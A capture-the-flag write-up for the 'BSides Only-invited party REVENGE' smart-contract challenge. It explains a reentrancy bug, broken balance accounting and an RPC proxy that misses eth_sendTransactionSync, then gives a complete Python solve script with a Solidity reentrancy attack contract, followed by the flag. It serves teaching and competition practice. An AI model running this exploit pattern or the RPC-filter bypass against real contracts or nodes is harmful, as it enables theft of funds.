<style>
:root {
  color-scheme: dark;
  --bg: #020617;
  --fg: #e5e7eb;
  --fg-muted: #9ca3af;
  --accent: #38bdf8;
  --border-subtle: #1f2937;
}

/* Base page */
html, body {
  margin: 0;
  padding: 0;
  background: radial-gradient(circle at top left, #020617, #020617 40%, #020617 100%);
  color: var(--fg);
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif;
}

/* GitHub Pages wrappers */
.page-content, .wrapper, article, .post {
  background: transparent !important;
  max-width: 960px;
  margin: 0 auto;
  padding: 2.5rem 1.5rem 4rem;
}

/* Headings */
.post h1, .page-content h1, article h1 {
  font-size: 1.6rem;
  margin-bottom: 0.6rem;
}

.post h2, .page-content h2, article h2 {
  font-size: 1.1rem;
  margin-top: 1.8rem;
  margin-bottom: 0.6rem;
  color: var(--fg-muted);
}

/* Tables (optional, if you use them) */
table {
  border-collapse: collapse;
  width: 100%;
  font-size: 0.85rem;
  margin: 0.4rem 0 0.8rem;
  border-radius: 0.6rem;
  overflow: hidden;
}

th,
td {
  padding: 0.5rem 0.75rem;
  border-bottom: 1px solid var(--border-subtle);
  background-color: rgba(15, 23, 42, 0.9);
}

th {
  text-align: left;
  font-weight: 500;
  color: var(--fg-muted);
}

tbody tr:nth-child(even) td {
  background-color: rgba(15, 23, 42, 0.75);
}

tbody tr:last-child td {
  border-bottom: none;
}

/* Links */
a {
  color: var(--accent);
}

a:hover {
  text-decoration: none;
}

/* Code blocks */
pre,
code,
pre code,
.highlight,
.highlight pre,
.highlight code {
  background-color: rgba(15, 23, 42, 0.96) !important;
  color: var(--fg);
}

pre {
  border: 1px solid var(--border-subtle);
  padding: 0.85rem 1rem;
  border-radius: 0.5rem;
  overflow-x: auto;
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}

code {
  padding: 0.1rem 0.25rem;
  border-radius: 0.25rem;
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}
</style>

# BSides Only-invited party REVENGE Writeup

## TL;DR
- Same core bug chain as the original: reentrancy in `withdrawGoldenTicket` + broken balance accounting in `_transfer`.
- Proxy still blocks `eth_sendTransaction`, but allows `eth_sendTransactionSync`, which can send as the unlocked boss.
- The new `startParty` check (`sponsor != address(0)`) is irrelevant; we never need to call it.

## Changes From Original
- `Guardian.startParty` now requires `sponsor != address(0)`.
- Instance RPC is on port `8547`.

## Vulnerabilities
1. **Reentrancy in `withdrawGoldenTicket`**
   - ETH is sent to `msg.sender` before balances/locks are updated.
   - A reentrant receiver can transfer the ticket mid-withdraw to boost another address's balance.
2. **Bad balance accounting in `_transfer`**
   - `balances[from] = 0` instead of decrementing.
   - Any transfer from boss zeroes boss balance.
3. **Proxy filter gap**
   - Proxy blocks `eth_sendTransaction`, but `eth_sendTransactionSync` is allowed.
   - Anvil exposes `eth_sendTransactionSync`, which uses unlocked signers (`eth_accounts` returns boss).

## Exploit Outline
1. Deploy `BalanceBooster`:
   - Buys a ticket.
   - Reenters `withdrawGoldenTicket` and transfers the ticket to the player during the ETH send.
2. Call `attack()` twice:
   - First call funds with 1 ETH and leaves 1 ETH in the helper.
   - Second call reuses that ETH to mint and reenter again.
3. Use `eth_sendTransactionSync` from the boss to call `transferTicket(1, player)`.
   - This zeroes `balances(boss)` and increments `balances(player)`.
4. `isSolved()` becomes true; request the flag.

## Solve Script
Dependencies:
```
pip install web3 py-solc-x eth-account requests
```

Usage:
```
python solve_revenge.py --rpc <RPC_URL> --priv <PLAYER_PRIV> --setup <SETUP_ADDR>
```

Script:
```python
#!/usr/bin/env python3
import argparse
import requests

from eth_account import Account
from web3 import Web3

try:
    import solcx
except ImportError as exc:
    raise SystemExit("py-solc-x is required: pip install py-solc-x") from exc

BALANCE_BOOSTER_SRC = r'''
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

interface IParty {
    function buyGoldenTicket() external payable returns (uint);
    function withdrawGoldenTicket(uint tokenId) external;
    function transferTicket(uint tokenId, address recipient) external;
}

// Uses withdraw() reentrancy to increment a recipient balance
// while zeroing totalEthLocked back to 0.
contract BalanceBooster {
    IParty public party;
    address public recipient;
    uint public tokenId;
    bool private inReceive;

    constructor(address _party, address _recipient) {
        party = IParty(_party);
        recipient = _recipient;
    }

    function attack() external payable {
        require(address(this).balance >= 1 ether, "fund 1 ether");
        tokenId = party.buyGoldenTicket{value: 1 ether}();
        party.withdrawGoldenTicket(tokenId);
    }

    receive() external payable {
        if (inReceive) return;
        inReceive = true;
        party.transferTicket(tokenId, recipient);
        inReceive = false;
    }
}
'''


def compile_booster():
    solcx.install_solc("0.8.14")
    compiled = solcx.compile_source(
        BALANCE_BOOSTER_SRC, output_values=["abi", "bin"], solc_version="0.8.14"
    )
    _, contract_interface = next(iter(compiled.items()))
    return contract_interface["abi"], contract_interface["bin"]


def send_tx(w3, account, tx):
    signed = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    return w3.eth.wait_for_transaction_receipt(tx_hash)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--rpc", required=True)
    parser.add_argument("--priv", required=True)
    parser.add_argument("--setup", required=True)
    args = parser.parse_args()

    w3 = Web3(Web3.HTTPProvider(args.rpc))
    acct = Account.from_key(args.priv)
    player = acct.address

    setup_abi = [
        {
            "inputs": [],
            "name": "party",
            "outputs": [{"internalType": "address", "name": "", "type": "address"}],
            "stateMutability": "view",
            "type": "function",
        },
        {
            "inputs": [],
            "name": "owner",
            "outputs": [{"internalType": "address", "name": "", "type": "address"}],
            "stateMutability": "view",
            "type": "function",
        },
        {
            "inputs": [],
            "name": "isSolved",
            "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
            "stateMutability": "view",
            "type": "function",
        },
    ]
    setup = w3.eth.contract(address=Web3.to_checksum_address(args.setup), abi=setup_abi)
    party_addr = setup.functions.party().call()
    boss_addr = setup.functions.owner().call()

    # Deploy BalanceBooster
    booster_abi, booster_bin = compile_booster()
    booster_factory = w3.eth.contract(abi=booster_abi, bytecode=booster_bin)
    nonce = w3.eth.get_transaction_count(acct.address)
    deploy_tx = booster_factory.constructor(party_addr, player).build_transaction(
        {
            "from": acct.address,
            "nonce": nonce,
            "gas": 1_000_000,
            "gasPrice": w3.eth.gas_price,
            "chainId": w3.eth.chain_id,
        }
    )
    receipt = send_tx(w3, acct, deploy_tx)
    booster_addr = receipt.contractAddress
    booster = w3.eth.contract(address=booster_addr, abi=booster_abi)

    # Run reentrancy twice (second call reuses the contract's 1 ETH balance).
    for i in range(2):
        nonce = w3.eth.get_transaction_count(acct.address)
        tx = booster.functions.attack().build_transaction(
            {
                "from": acct.address,
                "nonce": nonce,
                "gas": 400_000,
                "gasPrice": w3.eth.gas_price,
                "chainId": w3.eth.chain_id,
                "value": 0 if i > 0 else w3.to_wei(1, "ether"),
            }
        )
        send_tx(w3, acct, tx)

    # Transfer boss ticket via eth_sendTransactionSync (not blocked by proxy).
    party_abi = [
        {
            "inputs": [
                {"internalType": "uint256", "name": "tokenId", "type": "uint256"},
                {"internalType": "address", "name": "recipient", "type": "address"},
            ],
            "name": "transferTicket",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function",
        }
    ]
    party = w3.eth.contract(address=party_addr, abi=party_abi)
    call_data = party.encode_abi("transferTicket", args=[1, player])

    payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "eth_sendTransactionSync",
        "params": [
            {
                "from": boss_addr,
                "to": party_addr,
                "data": call_data,
                "gas": hex(150_000),
            }
        ],
    }
    resp = requests.post(args.rpc, json=payload, timeout=10)
    resp.raise_for_status()
    result = resp.json()
    if "error" in result:
        raise SystemExit(f"eth_sendTransactionSync failed: {result}")

    # Check solve status
    print("isSolved:", setup.functions.isSolved().call())


if __name__ == "__main__":
    main()
```

## Flag
`shellmates{REV3Ng3_r3veeE3ng3_n0_4ddR3SsZer0_Pr3C0mP1l3sh4256}`
